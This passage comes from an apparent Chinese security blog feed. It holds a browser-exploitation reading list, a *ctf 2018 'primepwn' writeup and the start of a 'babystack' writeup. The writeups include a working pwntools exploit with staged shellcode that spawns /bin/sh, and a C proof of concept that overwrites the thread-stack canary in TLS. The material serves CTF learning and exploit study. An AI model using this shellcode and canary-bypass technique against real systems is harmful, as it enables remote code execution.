href="https://github.com/secmob/BadKernel" target="_blank" rel="noopener">https://github.com/secmob/BadKernel</a></li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=386988" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=386988</a></li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=416449" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=416449</a></li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=468933(pwn2own" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=468933(pwn2own</a> 2015)</li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=595834(pwn2own" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=595834(pwn2own</a> 2016)</li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=659474" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=659474</a></li><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=776677" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=776677</a></li><li><a href="https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/" target="_blank" rel="noopener">https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/</a></li><li><a href="https://www.it-sec-catalog.info/browser_exploitation.html" target="_blank" rel="noopener">https://www.it-sec-catalog.info/browser_exploitation.html</a></li><li><a href="https://github.com/tunz/js-vuln-db" target="_blank" rel="noopener">https://github.com/tunz/js-vuln-db</a></li></ul><h2 id="SpiderMonkey-exploit-study"><a href="#SpiderMonkey-exploit-study" class="headerlink" title="SpiderMonkey exploit study"></a>SpiderMonkey exploit study</h2><ul><li><a href="http://www.geeknik.net/6zawqzuuu" target="_blank" rel="noopener">http://www.geeknik.net/6zawqzuuu</a></li><li><a href="https://phoenhex.re/2017-06-21/firefox-structuredclone-refleak" target="_blank" rel="noopener">https://phoenhex.re/2017-06-21/firefox-structuredclone-refleak</a></li><li><a href="https://grehack.fr/data/2017/slides/GreHack17_Get_the_Spidermonkey_off_your_back.pdf" target="_blank" rel="noopener">https://grehack.fr/data/2017/slides/GreHack17_Get_the_Spidermonkey_off_your_back.pdf</a></li><li><a href="https://github.com/rh0dev/slides/blob/master/OffensiveCon2018_From_Assembly_to_JavaScript_and_back.pdf" target="_blank" rel="noopener">https://github.com/rh0dev/slides/blob/master/OffensiveCon2018_From_Assembly_to_JavaScript_and_back.pdf</a></li></ul><h2 id="WebKit-JSC-exploit-study"><a href="#WebKit-JSC-exploit-study" class="headerlink" title="WebKit-JSC exploit study"></a>WebKit-JSC exploit study</h2><ul><li><a href="https://cansecwest.com/slides/2015/Liang_CanSecWest2015.pdf" target="_blank" rel="noopener">https://cansecwest.com/slides/2015/Liang_CanSecWest2015.pdf</a></li><li><a href="http://www.powerofcommunity.net/poc2016/keen.pdf" target="_blank" rel="noopener">http://www.powerofcommunity.net/poc2016/keen.pdf</a></li><li><a href="http://www.phrack.org/papers/attacking_javascript_engines.html" target="_blank" rel="noopener">http://www.phrack.org/papers/attacking_javascript_engines.html</a></li><li><a href="https://scarybeastsecurity.blogspot.jp/2017/05/ode-to-use-after-free-one-vulnerable.html" target="_blank" rel="noopener">https://scarybeastsecurity.blogspot.jp/2017/05/ode-to-use-after-free-one-vulnerable.html</a></li><li><a href="https://phoenhex.re/2017-06-09/pwn2own-diskarbitrationd-privesc" target="_blank" rel="noopener">https://phoenhex.re/2017-06-09/pwn2own-diskarbitrationd-privesc</a></li><li><a href="https://phoenhex.re/2017-07-06/pwn2own-sandbox-escape" target="_blank" rel="noopener">https://phoenhex.re/2017-07-06/pwn2own-sandbox-escape</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;v8的知识结构&quot;&gt;&lt;a href=&quot;#v8的知识结构&quot; class=&quot;headerlink&quot; title=&quot;v8的知识结构&quot;&gt;&lt;/a&gt;v8的知识结构&lt;/h1&gt;&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>CTF中利用syscall写shellcode及*ctf primepwn writeup</title>
    <link href="http://eternalsakura13.com/2018/04/27/star_primepwn/"/>
    <id>http://eternalsakura13.com/2018/04/27/star_primepwn/</id>
    <published>2018-04-27T05:03:26.181Z</published>
    <updated>2018-04-27T17:49:38.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如何写shellcode是二进制选手的基本素养了，本题中通过syscall的一些trick用法来写shellcode，getshell。</p><h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/primepwn" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/primepwn</a><br><a href="https://github.com/sixstars/starctf2018/tree/master/pwn-primepwn" target="_blank" rel="noopener">https://github.com/sixstars/starctf2018/tree/master/pwn-primepwn</a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Linux系统调用"><a href="#Linux系统调用" class="headerlink" title="Linux系统调用"></a>Linux系统调用</h3><p>举个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line"></span><br><span class="line">msg:</span><br><span class="line">    .ascii &quot;Hello, world!\n&quot;</span><br><span class="line">    len = . - msg</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">    .global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    movq  $1, %rax</span><br><span class="line">    movq  $1, %rdi</span><br><span class="line">    movq  $msg, %rsi</span><br><span class="line">    movq  $len, %rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    movq  $60, %rax</span><br><span class="line">    xorq  %rdi, %rdi</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure></p><p>输出结果是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./test</span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure></p><p>实际上这里是直接使用了write的syscall，它的系统调用号是1.<br>其他的syscall的系统调用号可以在<a href="https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/arch/x86/entry/syscalls/syscall_64.tbl" target="_blank" rel="noopener">系统调用表</a>查看。<br>我们可以看到我们在示例程序里用到的，1是write，60是exit退出程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1commonwritesys_write</span><br><span class="line">60commonexitsys_exit</span><br></pre></td></tr></table></figure></p><p>对于64位程序，通过syscall进入系统调用，将系统调用号传入rax，各个参数按照rdi、rsi、rdx的顺序传递到寄存器中，系统调用返回值储存到rax寄存器。</p><h3 id="syscall的trick"><a href="#syscall的trick" class="headerlink" title="syscall的trick"></a>syscall的trick</h3><p>syscall在所有寄存器都为0的情况下，执行的时候会把rip赋值给rcx。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-050803.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-050747.png" alt=""><br>首先输入一个unsigned long也就是8字节的数据，然后判定输入的数据(写到0x601038)是不是素数，如果不是素数，程序就结束掉，如果是素数，那么继续运行。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-051405.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-051440.png" alt=""><br>可以看到0x601030存放的是指向0x601038的指针。<br>之后程序会把寄存器都清零，然后跳到0x601030指向的空间执行，也就是跳到0x601038，执行我们写入的数据。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>为了方便读者自己调试分析，我就走一遍exp，然后描述一下利用过程。<br>exp如下，我加了一行gdb.attach用来调试。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> bruteforce</span><br><span class="line"><span class="keyword">from</span> parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">pwn_file=<span class="string">"./primepwn"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)==<span class="number">1</span>:</span><br><span class="line">    conn=process(pwn_file)</span><br><span class="line">    pid=conn.pid</span><br><span class="line">    gdb.attach(conn) <span class="comment"># 用作调试</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    conn=remote(<span class="string">"47.89.18.224"</span>,<span class="number">10008</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">brute_force</span><span class="params">(prefix,s)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> bruteforce(<span class="keyword">lambda</span> x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=<span class="number">4</span>)</span><br><span class="line">    data=conn.recvline(keepends=<span class="keyword">False</span>)</span><br><span class="line">    prefix,s=parse(<span class="string">"sha256(xxxx+&#123;&#125;) == &#123;&#125;"</span>,data)</span><br><span class="line">    conn.sendline(brute_force(prefix,s))</span><br><span class="line">    pid=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    log.debug(<span class="string">"process pid:%d"</span>%pid)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>,len(s),<span class="number">4</span>):</span><br><span class="line">        last=u32(s[i<span class="number">-4</span>:i])</span><br><span class="line">        now=u32(s[i:i+<span class="number">4</span>])</span><br><span class="line">        <span class="keyword">if</span> last &gt; now:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">code=<span class="string">"""</span></span><br><span class="line"><span class="string">start:</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    mov esi,ecx</span></span><br><span class="line"><span class="string">    jmp start</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">payload=asm(code,arch=<span class="string">"amd64"</span>)</span><br><span class="line">conn.sendline(str(u64(payload)))</span><br><span class="line">log.debug(<span class="string">"sleep 20s"</span>)</span><br><span class="line">sleep(<span class="number">20</span>)</span><br><span class="line">code=<span class="string">"""</span></span><br><span class="line"><span class="string">    mov rsp,rcx</span></span><br><span class="line"><span class="string">    add rsp,0x100</span></span><br><span class="line"><span class="string">    mov rax,0x3b</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    call get_shell</span></span><br><span class="line"><span class="string">    .ascii "/bin/sh"</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">get_shell:</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">conn.send(asm(code,arch=<span class="string">"amd64"</span>))</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure></p><p>然后我们开始调试，如果你使用pwndbg插件，看到的应该和我一样。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173228.png" alt=""><br>这样我们就断在了main函数执行之前，我们的目的是进入main函数单步看exp执行.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173323.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173521.png" alt=""><br>所以我们按5次finish（finsh的作用是执行到当前函数结束返回）<br>现在你应该看到下面这样：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173438.png" alt=""><br>然后单步n，一直单步到main函数最后的jmp。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173715.png" alt=""></p><p>由程序分析可知，首先我们要准备一个是素数的shellcode,且不能超过8个字节。<br>利用我们之前提到的syscall trick就可以做到，后面会分析为什么。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-071108.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">    syscall</span><br><span class="line">    dec edx</span><br><span class="line">    mov esi,ecx</span><br><span class="line">    jmp start</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400A57 loc_400A57:                             ; CODE XREF: main+56↑j</span><br><span class="line">.text:0000000000400A57                 xor     rax, rax</span><br><span class="line">.text:0000000000400A5A                 xor     rbx, rbx</span><br><span class="line">.text:0000000000400A5D                 xor     rcx, rcx</span><br><span class="line">.text:0000000000400A60                 xor     rdx, rdx</span><br><span class="line">.text:0000000000400A63                 xor     rsi, rsi</span><br><span class="line">.text:0000000000400A66                 xor     rdi, rdi</span><br><span class="line">.text:0000000000400A69                 xor     rsp, rsp</span><br><span class="line">.text:0000000000400A6C                 xor     rbp, rbp</span><br><span class="line">.text:0000000000400A6F                 xor     r8, r8</span><br><span class="line">.text:0000000000400A72                 xor     r9, r9</span><br><span class="line">.text:0000000000400A75                 xor     r10, r10</span><br><span class="line">.text:0000000000400A78                 xor     r11, r11</span><br><span class="line">.text:0000000000400A7B                 xor     r12, r12</span><br><span class="line">.text:0000000000400A7E                 xor     r13, r13</span><br><span class="line">.text:0000000000400A81                 xor     r14, r14</span><br><span class="line">.text:0000000000400A84                 xor     r15, r15</span><br><span class="line">.text:0000000000400A87                 jmp     cs:qword_601030</span><br></pre></td></tr></table></figure><p>由于在这里我们通过xor把寄存器都清空了，所以在执行syscall的时候，把rip的值赋给了rcx。<br>syscall执行前<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173831.png" alt=""><br>syscall执行后<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173907.png" alt=""><br>然后传递参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dec edx</span><br><span class="line">mov esi,ecx</span><br></pre></td></tr></table></figure></p><p>edx从0减去1就是-1，即0xFFFFFFFF。<br>esi=ecx=rip。<br>rdi和eax在之前就已经被清零了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-173943.png" alt=""><br>jmp跳到syscall执行，相当于调用sys_read(0,rip,0xFFFFFFFF)<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174015.png" alt=""><br>sys_read执行结束后，0x60103a(即rip，也就是下一条要执行的命令)及其之后的指令被覆盖,如下图可以看到我们将继续执行真正的shellcode。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174142.png" alt=""></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-071417.jpg" alt=""><br>将真正的shellcode读入到rip中，这样，继续执行就执行到了我们的shellcode。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">code=&quot;&quot;&quot;</span><br><span class="line">    mov rsp,rcx</span><br><span class="line">    add rsp,0x100---&gt;这句可以删掉</span><br><span class="line">    mov rax,0x3b</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    call get_shell</span><br><span class="line">    .ascii &quot;/bin/sh&quot;</span><br><span class="line">    .byte 0</span><br><span class="line">get_shell:</span><br><span class="line">    pop rdi</span><br><span class="line">    syscall</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure></p><p>因为之前rsp被置0了，所以为了在栈上保存/bin/sh，用在后面pop rdi。<br>现在要让rsp指向一个可写的地址，于是把rcx赋值给它。<br>然后将execve的系统调用号赋值给rax。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x3bexecvesys_execve/ptregs</span><br></pre></td></tr></table></figure></p><p>传递参数，执行execve(‘/bin/sh’,0,0)来getshell<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174412.png" alt=""><br>注意在call的时候，会先把返回地址压栈，而返回地址就是下一条指令，也就是0x601056。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174616.png" alt=""><br>gdb里si跟入call的函数。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174717.png" alt=""><br>然后pop rdi就把参数传进去了，接着syscall就执行了execve(‘/bin/sh’,0,0)<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174823.png" alt=""><br>getshell<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-27-174852.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;如何写shellcode是二进制选手的基本素养了，本题中通过syscall的一些trick用法来写shellcode，getshell。&lt;/
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="其他" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%85%B6%E4%BB%96/"/>
    
    
  </entry>
  
  <entry>
    <title>thread stack bypass canary和sixstar ctf babystack writeup</title>
    <link href="http://eternalsakura13.com/2018/04/24/starctf_babystack/"/>
    <id>http://eternalsakura13.com/2018/04/24/starctf_babystack/</id>
    <published>2018-04-24T15:51:19.659Z</published>
    <updated>2018-04-27T05:04:04.344Z</updated>
    
    <content type="html"><![CDATA[<h2 id="赛题链接"><a href="#赛题链接" class="headerlink" title="赛题链接"></a>赛题链接</h2><p><a href="https://github.com/sixstars/starctf2018/tree/master/pwn-babystack" target="_blank" rel="noopener">https://github.com/sixstars/starctf2018/tree/master/pwn-babystack</a><br><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/babystack" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/babystack</a><br>sixstar是真的良心，连赛题源码都放出了，十分适合学习。</p><h2 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h2><h3 id="TLS和thread-stack"><a href="#TLS和thread-stack" class="headerlink" title="TLS和thread stack"></a>TLS和thread stack</h3><p>用到的技术来源于<a href="http://www.openwall.com/lists/oss-security/2018/02/27/5" target="_blank" rel="noopener">New bypass and protection techniques for ASLR on Linux</a><br>这篇文章，我把其中重点的部分按照我的理解翻译了一下，如果有问题请指正~</p><p>线程局部存储（Thread Local Storage）是一种机制，通过该机制分配变量，以便每一个现存的线程都有一个变量实例。<br>它主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时。为了解决这个问题，我们可以通过TLS机制，为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其它线程的副本冲突。从线程的角度看，就好像每一个线程都完全拥有该变量。而从全局变量的角度上来看，就好像一个全局变量被克隆成了多份副本，而每一份副本都可以被一个线程独立地改变。</p><p>这个机制在不同的架构和操作系统上的实现不同，本例实现在x86-64，glibc。<br>在本例中,mmap也被用来创建线程，这意味着如果TLS接近vulnerable object，它可能会被修改。<br>有趣的是，在glibc实现中，TLS被指向一个segment register fs(x86-64上)，它的结构tcbhead_t定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">int</span> gscope_flag;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure></p><p>它包括了stack_guard，即被称作canary的随机数，用来防止栈溢出。<br>它的工作模式是：当一个函数被调用，canary从tcbhead_t.stack_guard被放到栈上。在函数调用结束的时候，栈上的值被和tcbhead_t.stack_guard比较，如果两个值是不相等的，程序将会返回error并且终止。<br>研究表明，glibc在TLS实现上存在问题，线程在pthread_create的帮助下创建，然后需要给这个新线程选择TLS。<br>在为栈分配内存后，glibc在内存的高地址初始化TLS，在x86-64架构上，栈向下增长，将TLS放在栈顶部。<br>从TLS中减去一个特定的常量值，我们得到被新线程的stack register所使用的值。<br>从TLS到pthread_create的函数参数传递栈帧的距离小于一页。<br>现在攻击者将不需要得到leak canary的值，而是直接栈溢出足够多的数据来复写TLS中的tcbhead_t.stack_guard的值，从而bypass canary。<br>下面是一个例子。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwn_payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[<span class="number">2</span>] = &#123;<span class="string">"/bin/sh"</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fixup = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">first</span><span class="params">(<span class="keyword">void</span> *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr;</span><br><span class="line">    arch_prctl(ARCH_GET_FS, &amp;addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"thread FS %p\n"</span>, addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cookie thread: 0x%lx\n"</span>, addr[<span class="number">5</span>]);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> * frame = __builtin_frame_address(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack_cookie addr %p \n"</span>, &amp;frame[<span class="number">-1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"diff : %lx\n"</span>, (<span class="keyword">char</span>*)addr - (<span class="keyword">char</span>*)&amp;frame[<span class="number">-1</span>]); </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len =(<span class="keyword">unsigned</span> <span class="keyword">long</span>)( (<span class="keyword">char</span>*)addr - (<span class="keyword">char</span>*)&amp;frame[<span class="number">-1</span>]) + </span><br><span class="line">fixup;</span><br><span class="line">    <span class="comment">// example of exploitation</span></span><br><span class="line">    <span class="comment">// prepare exploit</span></span><br><span class="line">    <span class="keyword">void</span> *exploit = <span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="built_in">memset</span>(exploit, <span class="number">0x41</span>, len);</span><br><span class="line">    <span class="keyword">void</span> *ptr = &amp;pwn_payload;</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">char</span>*)exploit + <span class="number">16</span>, &amp;ptr, <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// exact stack-buffer overflow example</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;frame[<span class="number">-1</span>], exploit, len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> one;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr;</span><br><span class="line">    <span class="keyword">void</span> *val;</span><br><span class="line">    arch_prctl(ARCH_GET_FS, &amp;addr);</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">        fixup = <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"main FS %p\n"</span>, addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cookie main: 0x%lx\n"</span>, addr[<span class="number">5</span>]);</span><br><span class="line">    pthread_create(&amp;one, <span class="literal">NULL</span>, &amp;first, <span class="number">0</span>);</span><br><span class="line">    pthread_join(one,&amp;val);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果。<br><figure class="highlight 